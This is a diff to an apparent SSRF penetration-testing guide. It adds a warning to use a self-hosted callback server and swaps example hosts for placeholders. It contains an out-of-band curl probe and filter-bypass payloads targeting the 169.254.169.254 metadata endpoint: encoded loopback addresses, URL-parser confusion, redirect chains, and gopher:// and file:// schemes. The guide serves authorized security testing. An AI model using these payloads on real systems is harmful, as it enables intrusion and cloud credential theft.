@@ -17,9 +17,11 @@ Any input the server will resolve or retrieve — check each one:
 - Non-URL-looking: hostnames/IPs in JSON bodies, `Host`-style config values, S3 bucket/region params, git/svn repo URLs, database/connection strings, webhook config in admin panels.
 
 ## 2. Confirm with an OOB callback (works even when blind)
+`OOB_HOST` is a callback host you control — a self-hosted interactsh or a private Burp Collaborator server. A public server receives whatever the payload exfiltrates, which on an engagement is client data.
+
 ```bash
 # get a Collaborator/interactsh host, then point the param at it
-curl -s "https://TARGET/fetch?url=http://OOB_ID.oast.pro/probe"
+curl -s "https://TARGET/fetch?url=http://OOB_HOST/probe"
 # a DNS+HTTP hit on your listener = confirmed SSRF (the SERVER resolved & fetched it)
 ```
 Distinguish DNS-only (egress filtered, resolver reached) from a full HTTP hit. A callback from the target's egress IP is the cleanest proof. **DNS-only is still a lead**: the server resolved attacker-controlled DNS — record `outcome=inconclusive` (partial SSRF / egress-filtered) via `recall gaps`, do not refute.
@@ -54,7 +56,7 @@ Retrieving IAM creds / an OAuth token = critical. Prove access to the credential
 - Alternate encodings of 127.0.0.1: `2130706433` (decimal), `0x7f000001` (hex), `0177.0.0.1` (octal), `127.1`, `127.0.0.1.nip.io`, `[::1]`, `[::ffff:127.0.0.1]`, `0.0.0.0`, `①②⑦.0.0.1` (unicode).
 - DNS rebinding / attacker domain resolving to an internal IP; `localtest.me`, `*.nip.io`, `*.sslip.io` wildcards that resolve to any IP you embed.
 - Redirect chain: your server 302→`http://169.254.169.254/` (bypasses "must be https" / domain allowlist since the *redirect* target is what's fetched).
-- URL-parser confusion: `http://allowed.com@169.254.169.254`, `http://169.254.169.254#allowed.com`, `http://169.254.169.254%2f@allowed.com`, `http://169.254.169.254%00.allowed.com`, embedded creds, backslashes.
+- URL-parser confusion: `http://allowed.example@169.254.169.254`, `http://169.254.169.254#allowed.example`, `http://169.254.169.254%2f@allowed.example`, `http://169.254.169.254%00.allowed.example`, embedded creds, backslashes.
 - Schemes beyond http: `file://` (local read), `gopher://` (raw TCP → internal Redis/SMTP/HTTP with full control — the way to reach IMDSv2/POST endpoints), `dict://`, `ftp://`, `ldap://`, `sftp://` where the client supports them.
 
 ## Confirm vs false positive (calibrate, don't discard)
